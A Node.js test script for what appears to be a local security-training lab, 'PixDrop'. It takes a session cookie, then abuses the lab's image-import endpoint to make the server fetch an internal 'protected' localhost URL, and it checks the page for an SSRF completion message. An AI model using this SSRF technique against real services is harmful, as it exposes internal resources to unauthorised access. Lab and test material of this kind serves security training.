const http = require('http');

const PORT = 3000;

function requestWithCookie(path, cookie) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'localhost',
      port: PORT,
      path: path,
      method: 'GET',
      headers: {
        'Cookie': cookie
      }
    };

    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: body
        });
      });
    });

    req.on('error', reject);
    req.end();
  });
}

function request(path) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'localhost',
      port: PORT,
      path: path,
      method: 'GET'
    };

    const req = http.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: body
        });
      });
    });

    req.on('error', reject);
    req.end();
  });
}

async function runTest() {
  console.log("Starting PixDrop Test...");
  try {
    const res0 = await request('/labs/pixdrop/');
    const cookie = res0.headers['set-cookie'] ? res0.headers['set-cookie'][0].split(';')[0] : '';
    console.log("Session Cookie:", cookie);

    const publicUrl = encodeURIComponent('http://localhost:3000/labs/pixdrop/lab-internal/public');
    await requestWithCookie(`/labs/pixdrop/import?url=${publicUrl}`, cookie);
    console.log("Imported public image.");

    const protectedUrl = encodeURIComponent('http://localhost:3000/labs/pixdrop/lab-internal/protected');
    await requestWithCookie(`/labs/pixdrop/import?url=${protectedUrl}`, cookie);
    console.log("Imported protected internal resource.");

    const resFinal = await requestWithCookie('/labs/pixdrop/', cookie);
    console.log("Final body: ", resFinal.body);
    if (resFinal.body.includes('Investigation Complete') || resFinal.body.includes('✓ Investigation Complete') || resFinal.body.includes('Completed')) {
      console.log("PASS: SSRF Completed");
    } else {
      console.log("FAIL: SSRF Not Completed");
    }
  } catch (err) {
    console.error("Test failed with error:", err);
  }
}

runTest();
